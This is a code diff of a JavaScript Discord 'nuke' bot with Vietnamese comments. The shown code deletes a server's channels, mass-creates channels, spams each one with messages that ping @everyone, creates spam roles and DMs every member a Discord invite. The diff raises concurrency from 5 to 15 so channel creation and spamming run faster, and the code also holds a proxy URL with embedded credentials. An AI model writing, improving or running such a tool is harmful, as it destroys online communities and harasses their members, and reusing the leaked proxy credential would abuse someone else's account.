@@ -24,7 +24,7 @@ const CONFIG = {
   roleName: 'ROLE SPAM BY PTK',
   roleCount: 20,
   dmContent: '# > NUKE BY PHTUANKHANH\n\nhttps://discord.gg/BqZ7UdtwXG',
-  allowOthers: true   // true = ai gõ lệnh cũng chạy; false = chỉ bot tự gõ
+  allowOthers: true
 };
 
 const proxyStr = 'http://flme5a8d5ad-package-standard:d4bda2c8@proxy.flameproxies.com:8989';
@@ -181,8 +181,7 @@ function startBot(token, session) {
 
     const guild = message.guild;
     const content = message.content.trim().toLowerCase();
-    const raw = message.content.trim();
-
+    
     if (content === '!menu') {
       const menuMsg =
         `**DANH SÁCH LỆNH NUKE**\n` +
@@ -284,22 +283,34 @@ function startBot(token, session) {
           await Promise.allSettled(delPromises);
         }
 
-        pushLog(session, `Đang tạo ${cc} kênh và spam ${mc} tin/kênh...`, 'info');
-        const chLimit = sem(5);
-        const createPromises = Array.from({ length: cc }, () =>
+        // 3. TẠO KÊNH (BUNG HẾT TỐC ĐỘ)
+        pushLog(session, `Đang tạo ${cc} kênh...`, 'info');
+        const chLimit = sem(15);
+        const createdChannels = [];
+
+        await Promise.allSettled(Array.from({ length: cc }, () =>
           chLimit(async () => {
             const c = await safeRest(session, 'POST', `/guilds/${guild.id}/channels`, { name: chName, type: 0 }).catch(() => null);
-            if (!c) return;
-            channelsCreated++;
-            for (let i = 0; i < mc; i++) {
-              await safeRest(session, 'POST', `/channels/${c.id}/messages`, {
-                content: msgText,
-                allowed_mentions: ping ? { parse: ['everyone'] } : { parse: [] }
-              }).then(() => { msgsSent++; }).catch(() => {});
+            if (c) {
+              channelsCreated++;
+              createdChannels.push(c.id);
             }
           })
-        );
-        await Promise.allSettled(createPromises);
+        ));
+
+        // 4. SPAM TIN NHẮN (SAU KHI ĐÃ CÓ ĐỦ KÊNH)
+        pushLog(session, `Đang spam ${mc} tin/kênh...`, 'info');
+        const msgLimit = sem(15);
+        await Promise.allSettled(createdChannels.flatMap(cid =>
+          Array.from({ length: mc }, () =>
+            msgLimit(() =>
+              safeRest(session, 'POST', `/channels/${cid}/messages`, {
+                content: msgText,
+                allowed_mentions: ping ? { parse: ['everyone'] } : { parse: [] }
+              }).then(() => { msgsSent++; }).catch(() => {})
+            )
+          )
+        ));
 
         pushLog(session, `Đang DM toàn bộ thành viên...`, 'info');
         const members = await guild.members.fetch().catch(() => null);
